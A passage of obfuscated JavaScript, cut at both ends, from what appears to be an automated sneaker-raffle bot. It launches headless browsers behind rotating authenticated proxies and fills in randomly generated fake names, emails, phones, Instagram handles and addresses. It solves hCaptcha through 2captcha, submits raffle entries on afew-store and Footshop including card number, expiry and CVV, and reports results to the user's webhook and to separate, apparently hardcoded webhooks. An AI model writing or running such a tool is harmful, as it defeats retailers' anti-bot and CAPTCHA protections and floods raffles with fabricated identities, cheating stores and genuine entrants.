    var _0x173cd5 = _0x41e06e[_0x21df63]['Address1']['split'](''), _0x1502bd = _0x41e06e[_0x21df63]['Address2']['split'](''), _0x4ab1f4 = _0x41e06e[_0x21df63]['Email']['split']('@');
    for (var _0xbdd380 = 0x0; _0xbdd380 < _0x173cd5['length']; _0xbdd380++) {
        if (_0x173cd5[_0xbdd380] == 'X') {
            var _0xd0e90a = Math['round'](Math['random']() * (_0xb48b64['length'] - 0x1));
            _0x173cd5[_0xbdd380] = _0x11cfdf[_0xd0e90a];
        }
    }
    ;
    for (var _0xbdd380 = 0x0; _0xbdd380 < _0x1502bd['length']; _0xbdd380++) {
        if (_0x1502bd[_0xbdd380] == 'X') {
            var _0xd0e90a = Math['round'](Math['random']() * (_0xb48b64['length'] - 0x1));
            _0x1502bd[_0xbdd380] = _0x11cfdf[_0xd0e90a];
        }
    }
    ;
    _0x41e06e[_0x21df63]['FirstName'] == 'RANDOM' && (_0x41e06e[_0x21df63]['FirstName'] = _0x324188['first']());
    _0x41e06e[_0x21df63]['LastName'] == 'RANDOM' && (_0x41e06e[_0x21df63]['LastName'] = _0x324188['last']());
    _0x4ab1f4[0x0] == 'RANDOM' ? _0x4ab1f4[0x0] = '' + _0x324188['first']() + _0x324188['last']() + '@' : _0x4ab1f4[0x0] = _0x4ab1f4[0x0] + '@';
    _0x41e06e[_0x21df63]['Email'] = _0x4ab1f4['join'](''), _0x41e06e[_0x21df63]['Address1'] = _0x173cd5['join'](''), _0x41e06e[_0x21df63]['Address2'] = _0x1502bd['join']('');
    _0x41e06e[_0x21df63]['Phone'] == 'RANDOM' && (_0x41e06e[_0x21df63]['Phone'] = '0' + _0x561cbb(0x5f5e100, 0x3b9ac9ff));
    if (_0x41e06e[_0x21df63]['Follower'] == 'RANDOM') {
        var _0x4d5c52 = _0x561cbb(0x1, 0x270f);
        _0x41e06e[_0x21df63]['Follower'] = '' + _0x324188['first']() + _0x324188['last']() + _0x4d5c52 + '\x20';
    }
    _0x41e06e[_0x21df63]['HouseNumber'] == 'RANDOM' && (_0x41e06e[_0x21df63]['HouseNumber'] = _0x561cbb(0x1, 0xc8));
    if (_0x41e06e[_0x21df63]['Address1'] == 'RANDOM') {
        var _0x1c81a7 = Math['round'](Math['random']() * (_0xb48b64['length'] - 0x1)), _0x14a429 = _0x11cfdf[_0x1c81a7];
        _0x41e06e[_0x21df63]['Address1'] = _0x324188['last']() + 'straat', _0x41e06e[_0x21df63]['Zip'] == '' && (_0x41e06e[_0x21df63]['Postcode'] = _0x561cbb(0x3e8, 0x270f) + '\x20' + _0x14a429 + _0x14a429, _0x41e06e[_0x21df63]['Zip'] = _0x41e06e[_0x21df63]['Postcode']), _0x41e06e[_0x21df63]['HouseNumber'] = '' + _0x561cbb(0x1, 0xc8);
    }
    return;
}
;
function _0x32665a() {
    let _0x5a186e = proxyFile['split']('\x0a'), _0x2de5eb = _0x5a186e['map']((_0x1bca4d, _0x1ce0e3) => {
        sanatizeProxy = _0x1bca4d['replace']('\x0d', '');
        if (_0x5a186e[_0x1ce0e3 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2de5eb;
}
;
async function _0x3e6c51(_0x51b547) {
    var _0x5cbd2b = _0x51b547[0x1]['split'](':');
    const _0x5bea20 = await _0x2d6840['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x5cbd2b[0x0] + ':' + _0x5cbd2b[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x4cd332 = await _0x5bea20['newPage']();
        await _0x4cd332['authenticate']({
            'username': '' + _0x5cbd2b[0x2],
            'password': '' + _0x5cbd2b[0x3]
        }), console['log'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x4cd332['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4cd332['setRequestInterception'](!![]), _0x4cd332['on']('request', _0x498c72 => {
            _0x498c72['resourceType']() === 'image' || _0x498c72['resourceType']() === 'font' || _0x498c72['resourceType']() === 'media' ? _0x498c72['abort']() : _0x498c72['continue']();
        }), await _0x4cd332['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x4cd332['waitForTimeout'](0xbb8), await _0x4cd332['waitForSelector']('.product-card');
        const _0x1e7404 = await _0x4cd332['$$eval']('a.product-card', _0x1b8383 => {
            return _0x1b8383['map'](_0x25b8c7 => _0x25b8c7['href']);
        });
        return _0x2e2911 = _0x1e7404;
    } catch (_0x200ebb) {
        console['log']('\x20' + _0x200ebb);
    } finally {
        _0x5bea20['close'](), console['clear']();
    }
}
;
async function _0x471b20(_0x5d4acc, _0x1af43f, _0x540d10, _0x1362a3, _0x4b3ff6) {
    _0x1af43f != 'ver' && await _0x5a7b4a(_0x1362a3, _0x5d4acc);
    if (_0x26509c['useRandomProxy'] = ![])
        var _0x2669c0 = _0x4b3ff6[_0x5d4acc]['split'](':');
    else
        var _0x34efae = Math['round'](Math['random']() * (_0x4b3ff6['length'] - 0x1)), _0x2669c0 = _0x4b3ff6[_0x34efae]['split'](':');
    var _0x3cb12b = _0x540d10['data'];
    _0x1af43f != 'ver' && (_0x3cb12b['data']['attributes']['properties']['$first_name'] = '' + _0x1362a3[_0x5d4acc]['FirstName'], _0x3cb12b['data']['attributes']['properties']['$last_name'] = '' + _0x1362a3[_0x5d4acc]['LastName'], _0x3cb12b['data']['attributes']['properties']['$address1'] = _0x1362a3[_0x5d4acc]['Address1'] + '\x20' + _0x1362a3[_0x5d4acc]['HouseNumber'] + '\x20' + _0x1362a3[_0x5d4acc]['Address2'], _0x3cb12b['data']['attributes']['properties']['$zip'] = '' + _0x1362a3[_0x5d4acc]['Zip'], _0x3cb12b['data']['attributes']['properties']['$city'] = '' + _0x1362a3[_0x5d4acc]['City'], _0x3cb12b['data']['attributes']['properties']['$country'] = '' + _0x1362a3[_0x5d4acc]['Country'], _0x3cb12b['data']['attributes']['properties']['Size'] = '' + _0x1362a3[_0x5d4acc]['Size'], _0x3cb12b['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0x1362a3[_0x5d4acc]['Follower'], _0x1af43f == 'exp' ? _0x3cb12b['data']['attributes']['email'] = '' + _0x1362a3[_0x5d4acc]['FirstName'] + _0x1362a3[_0x5d4acc]['LastName'] + _0x26509c['catchall'] : _0x3cb12b['data']['attributes']['email'] = '' + _0x1362a3[_0x5d4acc]['Email']);
    var _0x1513ed = {
        'jar': _0x6db637,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x540d10['url'],
        'headers': _0x540d10['headers'],
        'body': JSON['stringify'](_0x3cb12b),
        'proxy': 'http://' + _0x2669c0[0x2] + ':' + _0x2669c0[0x3] + '@' + _0x2669c0[0x0] + ':' + _0x2669c0[0x1]
    };
    return _0x1af43f === 'ver' && (_0x1513ed['method'] = 'GET'), new Promise(function (_0x5097be, _0xf4bab1) {
        callback = async (_0x1e2bcf, _0x136153, _0x17a16d) => {
            if (!_0x1e2bcf && _0x136153['statusCode'] == 0xca || !_0x1e2bcf && _0x136153['statusCode'] == 0xc8) {
                _0x5097be(console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x540d10['name'] + ']\x20Task\x20' + (_0x5d4acc + 0x1) + ':\x20Raffle\x20Entered!')));
                if (_0x1af43f != 'ver') {
                    var _0x25da35 = await _0x4ec2d3(_0x1362a3[_0x5d4acc], _0x540d10, 'dev', ![]), _0x4214ec = await _0x4ec2d3(_0x1362a3[_0x5d4acc], _0x540d10, 'pub', ![]);
                    const _0x460705 = {
                        'succesDEVMSG': { 'embeds': [_0x25da35] },
                        'succesPUBMSG': { 'embeds': [_0x4214ec] }
                    };
                    if (_0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '')
                        try {
                            await _0x2ebaaf(_0x26509c['webhook'], _0x460705['succesDEVMSG']);
                        } catch {
                        }
                    await _0x5df609(0xc8), await _0x2ebaaf(_0xa7232c, _0x460705['succesDEVMSG']), await _0x5df609(0xc8);
                    try {
                        await _0x2ebaaf(_0x19c58b, _0x460705['succesPUBMSG']);
                    } catch {
                    }
                } else {
                    if (_0x1af43f == 'ver') {
                        var _0x25da35 = await _0x4ec2d3(null, _0x540d10, 'ver', ![]);
                        const _0x3f0e15 = {
                            'succesDEVMSG': { 'embeds': [_0x25da35] },
                            'succesPUBMSG': { 'embeds': [_0x4214ec] }
                        };
                        await _0x2ebaaf(_0x5cfa73, _0x3f0e15['succesDEVMSG']);
                    }
                }
            } else {
                if (_0x1af43f != 'ver') {
                    var _0x2165b8 = '' + _0x1e2bcf, _0x518e3b = await _0x4ec2d3(_0x1362a3[_0x5d4acc], _0x540d10, 'dev', !![], _0x2165b8), _0x59e126 = {};
                    _0x59e126['errorDEV'] = { 'embeds': [_0x518e3b] }, _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x59e126['errorDEV']), await _0x2ebaaf(_0x2664b3, _0x59e126['errorDEV']);
                }
                _0xf4bab1(console['log'](_0x4db3b7() + '\x20[' + _0x540d10['name'] + ']\x20Task\x20' + (_0x5d4acc + 0x1) + ':\x20' + _0x1e2bcf));
            }
        };
        try {
            _0x1af43f === 'ver' ? console['log'](_0x4db3b7() + '\x20[' + _0x540d10['name'] + ']\x20Task\x20' + (_0x5d4acc + 0x1) + ':\x20Verifying.') : console['log'](_0x4db3b7() + '\x20[' + _0x540d10['name'] + ']\x20Task\x20' + (_0x5d4acc + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3cb12b['data']['attributes']['email']), _0x434a82(_0x1513ed, callback);
        } catch (_0xf50b17) {
            console['log'](_0x4db3b7() + '\x20Task\x20' + (_0x5d4acc + 0x1) + ':\x20' + _0xf50b17);
        }
    });
}
;
async function _0x26116d(_0x449174, _0xf100b7, _0x57ace9) {
    _0x2d6840['use'](_0x4c8616()), _0x2d6840['use'](_0x2e9f9f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x26509c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x47b680 = 0x0; _0x47b680 < _0x449174['length']; _0x47b680++) {
        var _0x149e70, _0x1416de = '', _0x5079e0 = 0x0, _0x1c09fe = [{
            'type': 'rich',
            'title': 'Succesful\x20Footshop\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x136a13
                },
                {
                    'name': 'Product',
                    'value': '' + _0x449174[_0x47b680]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x449174[_0x47b680]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x26509c['footshopDelay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x23a95c
                }
            ]
        }], _0x2afeba = await _0x4ec2d3(_0x449174[_0x47b680], _0x57ace9, 'dev', ![]), _0x35941c = await _0x4ec2d3(_0x449174[_0x47b680], _0x57ace9, 'pub', ![]);
        const _0x442f7e = {
            'succesDEVMSG': { 'embeds': [_0x2afeba] },
            'succesPUBMSG': { 'embeds': [_0x35941c] }
        }, _0x568a44 = { 'embeds': _0x1c09fe };
        await _0x5a7b4a(_0x449174, _0x47b680);
        if (_0x449174[_0x47b680]['Email'] == '' || _0x449174[_0x47b680]['FirstName'] == '' || _0x449174[_0x47b680]['LastName'] == '' || _0x449174[_0x47b680]['Country'] == '' || _0x449174[_0x47b680]['Size'] == '' || _0x449174[_0x47b680]['Address1'] == '' || _0x449174[_0x47b680]['Zip'] == '') {
            console['log'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x449174[_0x47b680]['Email'] == '' || _0x449174[_0x47b680]['FirstName'] == '' || _0x449174[_0x47b680]['LastName'] == '' || _0x449174[_0x47b680]['Country'] == '' || _0x449174[_0x47b680]['Size'] == '' || _0x449174[_0x47b680]['Address1'] == '' || _0x449174[_0x47b680]['Zip'] == '' || _0x449174[_0x47b680]['Phone'] == '') {
            console['log'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        const _0x2d339f = '' + _0x449174[_0x47b680]['Url'];
        if (_0x26509c['useRandomProxy'] = ![])
            var _0x3555dd = _0xf100b7[_0x47b680]['split'](':');
        else
            var _0xb3b60 = Math['round'](Math['random']() * (_0xf100b7['length'] - 0x1)), _0x3555dd = _0xf100b7[_0xb3b60]['split'](':');
        const _0x9ad182 = await _0x2d6840['launch']({
            'headless': !![],
            'args': ['--proxy-server=' + _0x3555dd[0x0] + ':' + _0x3555dd[0x1]]
        });
        try {
            const _0x388ed9 = await _0x9ad182['newPage']();
            await _0x388ed9['authenticate']({
                'username': '' + _0x3555dd[0x2],
                'password': '' + _0x3555dd[0x3]
            }), console['log'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x388ed9['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x388ed9['setRequestInterception'](!![]), _0x388ed9['on']('request', _0x4db5fe => {
                _0x4db5fe['resourceType']() === 'image' || _0x4db5fe['resourceType']() === 'font' || _0x4db5fe['resourceType']() === 'media' ? _0x4db5fe['abort']() : _0x4db5fe['continue']();
            }), await _0x388ed9['goto'](_0x2d339f), await _0x5df609(0xbb8), await _0x388ed9['waitForSelector']('.control__JhutY'), await _0x388ed9['click']('.control__JhutY'), await _0x5df609(0x1f4);
            if (_0x449174[_0x47b680]['Size'] != 'RANDOM')
                try {
                    const _0x5d3a1a = await _0x388ed9['$x']('//div[contains(text(),\x20\x27' + _0x449174[_0x47b680]['Size'] + '\x27)]');
                    await _0x5d3a1a[0x0]['click']();
                } catch {
                    console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                    continue;
                }
            else {
                const _0x1162b0 = await _0x388ed9['$$']('.options__3UQpT\x20>\x20div.row');
                var _0x30482d = Math['round'](Math['random']() * (_0x1162b0['length'] - 0x1));
                await _0x1162b0[_0x30482d]['click']();
            }
            await _0x5df609(0x4b0);
            const _0x115283 = await _0x388ed9['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
            await _0x115283[0x0]['click'](), await _0x388ed9['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x388ed9['type']('input[name=\x22email\x22]', '' + _0x449174[_0x47b680]['Email']), await _0x5df609(0x640), await _0x388ed9['type']('input[name=\x22phone\x22]', '' + _0x449174[_0x47b680]['Phone']), await _0x5df609(0x4b0), await _0x388ed9['click']('button.btn.continue-button__1RtsS'), await _0x5df609(0x4b0);
            try {
                await _0x388ed9['type']('input[name=\x22firstName\x22]', '' + _0x449174[_0x47b680]['FirstName']), await _0x5df609(0x258);
            } catch {
                const _0x9129c0 = await _0x388ed9['$$eval']('.invalid-feedback\x20>\x20div', _0x56a6e9 => {
                    return _0x56a6e9['map'](_0xb13175 => _0xb13175['innerText']);
                });
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x20' + _0x9129c0));
                continue;
            }
            await _0x388ed9['type']('input[name=\x22lastName\x22]', '' + _0x449174[_0x47b680]['LastName']), await _0x5df609(0xc8), await _0x388ed9['type']('input[name=\x22instagramUsername\x22]', '' + _0x449174[_0x47b680]['Follower']), await _0x5df609(0x4b0), await _0x388ed9['click']('button.btn.continue-button__1RtsS'), await _0x5df609(0x3e8), console['log'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x388ed9['select']('select[name=\x22country\x22]', '' + _0x449174[_0x47b680]['Country']), await _0x5df609(0x2bc), await _0x388ed9['type']('input[name=\x22streetName\x22]', '' + _0x449174[_0x47b680]['Address1']), await _0x5df609(0x258), await _0x388ed9['type']('input[name=\x22houseNumber\x22]', _0x449174[_0x47b680]['HouseNumber'] + '\x20' + _0x449174[_0x47b680]['Address2']), await _0x5df609(0xc8), await _0x388ed9['type']('input[name=\x22postalCode\x22]', '' + _0x449174[_0x47b680]['Zip']), await _0x5df609(0x1f4), await _0x388ed9['type']('input[name=\x22city\x22]', '' + _0x449174[_0x47b680]['City']), await _0x5df609(0x4b0), await _0x388ed9['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x5df609(0x4b0), await _0x388ed9['click']('button.btn.continue-button__1RtsS'), await _0x5df609(0x4b0), console['log'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x388ed9['solveRecaptchas'](), console['log'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x5df609(0xbb8), await _0x388ed9['click']('button.btn.continue-button__1RtsS'), await _0x5df609(0x1388), console['log'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x388ed9['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x388ed9['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5df609(0x4b0), await _0x388ed9['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x449174[_0x47b680]['CardNumber']), await _0x5df609(0x320), await _0x388ed9['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x388ed9['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x449174[_0x47b680]['ExpiryDate']), await _0x5df609(0x4b0), await _0x388ed9['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x388ed9['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x449174[_0x47b680]['CVV']), await _0x5df609(0x226), await _0x388ed9['type']('input[name=\x22holderName\x22]', '' + _0x449174[_0x47b680]['NameOnCard']), await _0x5df609(0x226), await _0x388ed9['click']('button.adyen-checkout__button'), console['log'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x388ed9['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x5df609(0xbb8);
            } catch (_0x3dc775) {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x203DS\x20Failed')), _0x149e70 = '3DS\x20Error\x20' + _0x3dc775;
                var _0x1acf0a = await _0x4ec2d3(_0x449174[_0x47b680], _0x57ace9, 'dev', !![], _0x149e70);
                _0x442f7e['errorDEV'] = { 'embeds': [_0x1acf0a] };
                _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x442f7e['errorDEV']);
                await _0x2ebaaf(_0x2664b3, _0x442f7e['errorDEV']);
                continue;
            }
            console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            if (_0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '')
                try {
                    await _0x2ebaaf(_0x26509c['webhook'], _0x442f7e['succesDEVMSG']);
                } catch {
                }
            await _0x5df609(0xc8), await _0x2ebaaf(_0xa7232c, _0x442f7e['succesDEVMSG']), await _0x5df609(0xc8);
            try {
                await _0x2ebaaf(_0x19c58b, _0x442f7e['succesPUBMSG']);
            } catch {
            }
        } catch (_0x3a3c89) {
            console['log'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x20' + _0x3a3c89), _0x149e70 = '' + _0x3a3c89;
            var _0x1acf0a = await _0x4ec2d3(_0x449174[_0x47b680], _0x57ace9, 'dev', !![], _0x149e70);
            _0x442f7e['errorDEV'] = { 'embeds': [_0x1acf0a] }, _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x442f7e['errorDEV']), await _0x2ebaaf(_0x2664b3, _0x442f7e['errorDEV']), _0x1416de = 'yes';
        } finally {
            _0x9ad182['close']();
            if (_0x1416de == 'yes' && _0x5079e0 != 0x5) {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x57ace9['name'] + ']\x20Task\x20' + (_0x47b680 + 0x1) + '\x20:\x20Retrying')), _0x47b680 = _0x47b680 - 0x1, _0x5079e0 = _0x5079e0 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x26509c['footshopDelay'] + '\x20ms'), await _0x5df609(_0x26509c['footshopDelay']);
        }
    }
}
afewFunction = async (_0x2f53db, _0x1c632a, _0x41c5e, _0x3178c6, _0x39db56) => {
    for (var _0x5f2041 = 0x0; _0x5f2041 < _0x3178c6['length']; _0x5f2041++) {
        _0x26509c['AfewDelay'] = _0x26509c['delay'];
        var _0x1c0526, _0x4942db = '', _0x41003c = 0x0;
        _0x3178c6[_0x5f2041]['Url'] = _0x2f53db, _0x2be893(_0x41c5e['name'] + '\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20/\x20' + _0x3178c6['length'] + '\x20||\x20File:\x20' + _0x21572d + '\x20Proxies:\x20' + _0x246cb8), await _0x5a7b4a(_0x3178c6, _0x5f2041);
        var _0x167b11 = await _0x4ec2d3(_0x3178c6[_0x5f2041], _0x41c5e, 'dev', ![]), _0xdf8366 = await _0x4ec2d3(_0x3178c6[_0x5f2041], _0x41c5e, 'pub', ![]);
        const _0x2e7bab = {
            'succesDEVMSG': { 'embeds': [_0x167b11] },
            'succesPUBMSG': { 'embeds': [_0xdf8366] }
        };
        if (_0x3178c6[_0x5f2041]['Email'] == '' || _0x3178c6[_0x5f2041]['FirstName'] == '' || _0x3178c6[_0x5f2041]['LastName'] == '' || _0x3178c6[_0x5f2041]['Country'] == '' || _0x3178c6[_0x5f2041]['Size'] == '' || _0x3178c6[_0x5f2041]['Address1'] == '' || _0x3178c6[_0x5f2041]['Zip'] == '') {
            console['log'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x26509c['useRandomProxy'] = ![])
            var _0x4b270e = _0x39db56[_0x5f2041]['split'](':');
        else
            var _0xd25f0c = Math['round'](Math['random']() * (_0x39db56['length'] - 0x1)), _0x4b270e = _0x39db56[_0xd25f0c]['split'](':');
        const _0xec453 = await _0x2d6840['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4b270e[0x0] + ':' + _0x4b270e[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x13135a = await _0xec453['newPage']();
            await _0x13135a['setDefaultNavigationTimeout'](0x1d4c0), await _0x13135a['authenticate']({
                'username': '' + _0x4b270e[0x2],
                'password': '' + _0x4b270e[0x3]
            }), console['log'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x13135a['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x13135a['setRequestInterception'](!![]), _0x13135a['on']('request', _0x15cdda => {
                _0x15cdda['resourceType']() === 'image' || _0x15cdda['resourceType']() === 'font' || _0x15cdda['resourceType']() === 'media' ? _0x15cdda['abort']() : _0x15cdda['continue']();
            }), await _0x13135a['goto'](_0x2f53db, { 'waitUntil': 'networkidle2' }), console['log'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x13135a['waitForTimeout'](0xfa0), console['log'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20Cookies\x20received'), await _0x13135a['waitForTimeout'](0x320);
            if (_0x3178c6[_0x5f2041]['Size'] == 'RANDOM') {
                console['log'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                const _0x22dcb1 = await _0x13135a['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x4655a7 => {
                    return _0x4655a7['map'](_0x36faf9 => _0x36faf9['href']);
                });
                var _0x55e59c = Math['round'](Math['random']() * (_0x22dcb1['length'] - 0x1));
                await _0x13135a['goto']('' + _0x22dcb1[_0x55e59c]);
            } else {
                console['log'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3178c6[_0x5f2041]['Size']);
                try {
                    const _0x5b20aa = await _0x13135a['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x3178c6[_0x5f2041]['Size'] + '\x22]\x20>\x20a', _0xcd22e0 => {
                        return _0xcd22e0['map'](_0x48648e => _0x48648e['href']);
                    });
                    await _0x13135a['goto']('' + _0x5b20aa[0x0], { 'waitUntil': 'networkidle2' });
                } catch (_0x139bf3) {
                    console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20' + _0x139bf3 + '\x20Size\x20not\x20found')), _0x1c0526 = 'Size\x20Not\x20Found';
                    var _0x24bc58 = await _0x4ec2d3(_0x3178c6[_0x5f2041], _0x41c5e, 'dev', !![], _0x1c0526);
                    _0x2e7bab['errorDEV'] = { 'embeds': [_0x24bc58] };
                    _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x2e7bab['errorDEV']);
                    await _0x2ebaaf(_0x2664b3, _0x2e7bab['errorDEV']);
                    continue;
                }
            }
            await _0x13135a['waitForTimeout'](0x258), await _0x13135a['type']('#raffle-instagram', '' + _0x3178c6[_0x5f2041]['Follower'], { 'delay': 0x64 }), await _0x13135a['waitForTimeout'](0x384), await _0x13135a['click']('#raffle-terms'), await _0x13135a['waitForTimeout'](0x384), await _0x13135a['evaluate'](() => {
                const _0x11b87f = document['querySelector']('button.btn[name=\x27add\x27]');
                _0x11b87f['click']();
            }), await _0x13135a['waitForTimeout'](0xbb8), await _0x13135a['waitForSelector']('#checkout_email'), await _0x5df609(0x3e8), console['log'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20Filling\x20Information');
            _0x1c632a == 'sec' ? await _0x13135a['type']('#checkout_email', '' + _0x3178c6[_0x5f2041]['FirstName'] + _0x3178c6[_0x5f2041]['LastName'] + _0x26509c['catchall'], 0x32) : await _0x13135a['type']('#checkout_email', '' + _0x3178c6[_0x5f2041]['Email'], 0x32);
            await _0x5df609(0x320), await _0x13135a['select']('#checkout_shipping_address_country', '' + _0x3178c6[_0x5f2041]['Country']), await _0x13135a['waitForTimeout'](0x258), await _0x13135a['type']('#checkout_shipping_address_first_name', '' + _0x3178c6[_0x5f2041]['FirstName']), await _0x13135a['waitForTimeout'](0x320), await _0x13135a['type']('#checkout_shipping_address_last_name', '' + _0x3178c6[_0x5f2041]['LastName']), await _0x13135a['waitForTimeout'](0x2bc), await _0x13135a['type']('#checkout_shipping_address_address1', _0x3178c6[_0x5f2041]['Address1'] + '\x20' + _0x3178c6[_0x5f2041]['HouseNumber']), await _0x13135a['waitForTimeout'](0x2bc), await _0x13135a['type']('#checkout_shipping_address_address2', '' + _0x3178c6[_0x5f2041]['Address2']), await _0x13135a['waitForTimeout'](0x2bc);
            _0x3178c6[_0x5f2041]['Postcode'] == undefined ? await _0x13135a['type']('#checkout_shipping_address_zip', '' + _0x3178c6[_0x5f2041]['Zip']) : await _0x13135a['type']('#checkout_shipping_address_zip', '' + _0x3178c6[_0x5f2041]['Postcode']);
            await _0x13135a['waitForTimeout'](0x2bc), await _0x13135a['type']('#checkout_shipping_address_city', '' + _0x3178c6[_0x5f2041]['City']), await _0x13135a['waitForTimeout'](0x2bc), console['log'](_0x4db3b7() + '\x20[' + _0x41c5e['name'] + ']\x20Task\x20' + (_0x5f2041 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x13135a, _0x13135a['evaluate'](() => {
